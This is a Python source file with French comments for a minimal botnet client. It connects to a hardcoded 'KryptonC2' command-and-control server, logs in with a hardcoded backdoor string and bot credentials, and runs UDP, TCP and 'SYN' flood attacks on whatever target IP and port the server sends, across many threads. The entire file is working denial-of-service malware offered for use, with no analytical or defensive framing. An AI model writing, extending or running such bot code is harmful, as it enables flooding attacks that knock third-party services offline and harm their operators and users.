#!/usr/bin/env python
# Bot minimaliste pour KryptonC2 - Fonctionne sans dépendances lourdes
# Version simplifiée qui fonctionne sur plus d'appareils

import socket
import threading
import time
import random
import struct
import os
import sys

# Configuration du serveur C2
KRYPTONC2_ADDRESS = "nlzpsjlvr.localto.net"
KRYPTONC2_PORT = 5941

def attack_udp(ip, port, secs, size):
    """Attaque UDP simplifiée"""
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            data = os.urandom(size)
            s.sendto(data, (ip, dport))
            s.close()
        except:
            pass

def attack_tcp(ip, port, secs, size):
    """Attaque TCP simplifiée"""
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            while time.time() < secs:
                s.send(os.urandom(size))
            s.close()
        except:
            pass

def attack_syn(ip, port, secs):
    """Attaque SYN simplifiée"""
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            while time.time() < secs:
                # Envoyer des données pour maintenir la connexion
                s.send(b'\x00' * 100)
            s.close()
        except:
            pass

def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    
    while 1:
        try:
            # Connexion au serveur C2
            c2.connect((KRYPTONC2_ADDRESS, KRYPTONC2_PORT))
            
            # Envoyer immédiatement le backdoor pour le captcha (comme le bot original)
            c2.send('669787761736865726500'.encode())
            
            # Attendre "Username :"
            while 1:
                time.sleep(1)
                data = c2.recv(1024).decode('utf-8', errors='ignore')
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break
            
            # Attendre "Password :"
            while 1:
                time.sleep(1)
                data = c2.recv(1024).decode('utf-8', errors='ignore')
                if 'Password' in data:
                    c2.send(b'\xff\xff\xff\xff\75')
                    break
            
            # Boucle principale pour recevoir les commandes
            while 1:
                try:
                    data = c2.recv(1024).decode('utf-8', errors='ignore').strip()
                    if not data:
                        break
                    
                    args = data.split(' ')
                    command = args[0].upper()
                    
                    if command == '.UDP':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        size = int(args[4])
                        threads = int(args[5]) if len(args) > 5 else 1
                        for _ in range(threads):
                            threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                    
                    elif command == '.TCP':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        size = int(args[4])
                        threads = int(args[5]) if len(args) > 5 else 1
                        for _ in range(threads):
                            threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                    
                    elif command == '.SYN':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        threads = int(args[4]) if len(args) > 4 else 1
                        for _ in range(threads):
                            threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
                    
                    elif command == 'PING':
                        c2.send('PONG'.encode())
                
                except Exception as e:
                    break
            
            c2.close()
            time.sleep(5)
            
        except Exception as e:
            c2.close()
            time.sleep(5)
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

if __name__ == '__main__':
    try:
        main()
    except:
        pass


